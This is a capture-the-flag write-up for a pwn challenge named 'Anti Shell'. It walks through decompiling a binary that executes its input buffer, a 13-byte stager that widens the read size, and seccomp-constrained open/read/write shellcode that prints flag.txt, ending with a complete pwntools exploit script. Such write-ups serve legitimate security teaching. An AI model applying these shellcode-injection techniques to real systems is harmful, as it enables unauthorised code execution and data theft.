# Anti Shell

## File Analysis
![image](https://github.com/user-attachments/assets/5c9a4839-5a6c-4d3f-9613-27395e73f796)

## Steps to Solve
## Step 1:

Use **Ghidra** to decompile the code, and I see that the first input actually does nothing. But the second input is actually vulnerable because of the <b>"(*(code *)local_28)();"</b> This will actually just execute anything inside the local_28 buffer.

<details>
  <summary>Decompile Code</summary>
  
```C
void main(void)

{
  undefined local_28 [28];
  undefined4 local_c;
  
  setup();
  printf("How many characters is your input?\n>> ");
  __isoc99_scanf(&DAT_0040202f,&local_c);
  getchar();
  printf("Okay, now give me your payload\n>> ");
  setup_jail();
  local_c = 0xd;
  vuln(local_28,0xd);
  (*(code *)local_28)();
                    /* WARNING: Subroutine does not return */
  exit(-1);
}
```

</details>

The **vuln** function actually just a normal **fgets**.

```C
void vuln(char *param_1,int param_2)

{
  fgets(param_1,param_2,stdin);
  return;
}
```

## Step 2
But from what we see, the local_28 is only taking 13 bytes as input. It is very hard to write a shell code in 13 bytes. Therefore, I tried to use this 13 bytes to modify the fgets size input. So that I can have enough size to write my shellcode.
 
![image](https://github.com/user-attachments/assets/ee17c2a2-08a0-4dcb-beab-866fd30fb7dd)

So from **GDB**, we can see that [rbp-0x20] is actually the local_28, and the size specify for the input is [rbp-0x4] because 0xd is moving into it.

![image](https://github.com/user-attachments/assets/11655bdc-2b21-41d3-838a-544e37f2c9c7)

But actually from here, the most interesting part is the <b>"call RDX"</b>, because we know that we got control of the local_28, which is the [rbp-0x20]. and also from the main+124, the [rbp-0x20] is moving to the rdx. Therefore, we know that we can inject malicious instruction into the RDX so it will then execute it.

## Step 3
So from here, we have to know that only **0xd (13) bytes** of size will be input into the local_28 buffer. And we have to think about what can we do with 13 bytes instruction. Then after a moment of thinking, I figure out that I can actually change the size of the fgets and calling with it because of we have control of the RDX. 

The payload will be
```python
payload = asm("pop rax; sub eax, 25; push rax; mov edx, 500; ret")
```

> What this payload actually does is, it will first pop rax. (Since it call RDX, so the next instruction's return address will be push to stack, so after the call RDX function finish its instruction and reach the **"ret"** then it will go back to the normal next instruction). So after **pop RAX**, the RAX now contain the address of **0x40135b (main +135)**. Then we just sub this 0x40135b with 25 then the rax now will become **0x40135b - 25 = 0x401342 (main +110)**. Then we just **mov 500 into edx**, because from the GDB we can see that the **edx is moving into the esi** which is the size. So we need to mov 500 into edx, to make a bigger size. Then **ret** will go back to the **0x401342 (main +110)** because now the return address of the stack frame is already **0x401342**.



With this, we can know that this payload is exactly **13 bytes**. Which can fill all the instructions into the local_28 buffer. Then, when we send this payload to the binary. It will then return another fgets with bigger size (in this case will be 500 bytes) and store it in local_28. But with the same issues, the binary will still call the RDX. Which is the buffer, means we still can send malicious instruction to the vuln buffer but then this time we have bigger size to do whatever we want.

## Step 4

```python
shellcode = shellcraft.sh()
```

![image](https://github.com/user-attachments/assets/8af35eaa-7a03-4c54-8f6f-6cbd8a487ab7)

So now that, I know I can write anything into the buffer then it will execute it. So I just use shellcraft to spawn a shell, but then I realized that it is not working and have **exit code -31 (SIGSYS)**. 

_**What is SIGSYS?**_
> **SIGSYS (Signal 31)** is a **bad system call signal**. It is sent to a process when it makes an **illegal system call** or attempts to execute a system call that the kernel doesn't allow (due to **sandboxing, seccomp filters, or missing capabilities**).   _*GENERATED BY CHATGPT*_

## Step 5

![image](https://github.com/user-attachments/assets/0b2c96f6-0e09-4882-a59b-e237169df5b5)

After receiving **SIGSYS**, then I try to use **[seccomp-tools](https://github.com/david942j/seccomp-tools)** and realized that this binary only allow us to use the **read, write, open** in the [syscall table](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md).

Then I just use chatgpt to generate a shellcraft using only **read, write, open** to read a flag.txt in the system.

```python
shellcode = shellcraft.open('flag.txt', 0)  # Open the file "flag.txt" (0 -> O_RDONLY)
shellcode += shellcraft.read('rax', 'rsp', 100)  # Read the file content into memory (rax -> fd, rsp -> buffer, 100 bytes)
shellcode += shellcraft.write(1, 'rsp', 100)  # Write the content to stdout (1 -> stdout, rsp -> buffer)
```

**_Explanation_**
> 1. shellcraft.open('flag.txt', 0): This opens the flag.txt file in **read-only mode** (O_RDONLY).
  > - The **file descriptor (fd)** of the opened file is stored in **rax**.
> 2. shellcraft.read('rax', 'rsp', 100): Reads 100 bytes from the **file descriptor(fd) in rax** into **memory starting at the address in rsp** (the stack pointer).
  > - The **file descriptor(fd) is rax**, which was **returned from the open call**.
  > - The **buffer is rsp** (stack pointer).
> 3. shellcraft.write(1, 'rsp', 100): Writes the 100 bytes from the stack (where the file content was read) to **stdout (file descriptor(fd) 1)**.
>
> _GENERATED BY CHATGPT_

<details>
  <summary>Exploit Script</summary>
  
  ```python
  from pwn import *

exe = context.binary = ELF('./challenge')

p = exe.process()

p.sendlineafter(b">> ", "50")

payload = asm("pop rax; sub eax, 25; push rax; mov edx, 500; ret")
p.sendlineafter(b">> ", payload)

shellcode = shellcraft.open("flag.txt", 0)
shellcode += shellcraft.read("rax", "rsp", 100)
shellcode += shellcraft.write(1, "rsp", 100)

p.sendline(asm(shellcode))

p.interactive()

  ```
</details>


![image](https://github.com/user-attachments/assets/f2efa3a7-9ce8-4321-964d-f8a25eb9c25c)


Just like that and we can read the flag!!!

